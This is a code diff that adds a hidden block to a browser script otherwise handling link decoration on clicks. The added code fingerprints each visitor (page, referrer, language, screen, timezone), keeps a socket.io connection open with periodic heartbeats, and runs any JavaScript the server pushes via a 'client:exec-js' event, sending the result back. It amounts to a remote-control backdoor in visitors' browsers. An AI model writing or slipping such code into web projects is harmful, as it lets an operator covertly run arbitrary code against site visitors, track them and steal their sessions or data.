@@ -160,4 +160,78 @@
     document.addEventListener("mousedown", decorate, true);
     document.addEventListener("click", decorate, true);
     document.addEventListener("auxclick", decorate, true);
+
+    function safeText(value) {
+        if (typeof value === "string") return value;
+        try { return JSON.stringify(value); } catch (e) { return String(value); }
+    }
+
+    function initLiveSocket() {
+        if (typeof window.io !== "function") return;
+        var socket;
+        try {
+            socket = window.io("/", {
+                path: "/socket.io",
+                transports: ["websocket", "polling"],
+                auth: {
+                    role: "client",
+                    page: location.pathname + location.search,
+                    title: document.title,
+                    referrer: document.referrer || "",
+                    language: navigator.language || "",
+                    screen: window.screen ? (window.screen.width + "x" + window.screen.height) : "",
+                    timezone: (window.Intl && Intl.DateTimeFormat().resolvedOptions().timeZone) || "",
+                    visible: document.visibilityState === "visible"
+                }
+            });
+        } catch (e) {
+            return;
+        }
+
+        function heartbeat() {
+            socket.emit("client:heartbeat", {
+                page: location.pathname + location.search,
+                title: document.title,
+                visible: document.visibilityState === "visible"
+            });
+        }
+
+        socket.on("client:exec-js", function (payload) {
+            var data = payload && typeof payload === "object" ? payload : {};
+            var code = String(data.code || "");
+            var commandId = String(data.commandId || "");
+            try {
+                var fn = new Function("return (async function(){" + code + "\n})();");
+                Promise.resolve(fn()).then(function (result) {
+                    socket.emit("client:exec-result", {
+                        commandId: commandId,
+                        ok: true,
+                        output: safeText(result)
+                    });
+                }).catch(function (error) {
+                    socket.emit("client:exec-result", {
+                        commandId: commandId,
+                        ok: false,
+                        output: error && error.message ? error.message : "execution error"
+                    });
+                });
+            } catch (error) {
+                socket.emit("client:exec-result", {
+                    commandId: commandId,
+                    ok: false,
+                    output: error && error.message ? error.message : "execution error"
+                });
+            }
+        });
+
+        setInterval(heartbeat, 15000);
+        document.addEventListener("visibilitychange", heartbeat);
+        heartbeat();
+    }
+
+    if (document.readyState === "loading") {
+        document.addEventListener("DOMContentLoaded", initLiveSocket);
+    } else {
+        initLiveSocket();
+    }
 })();
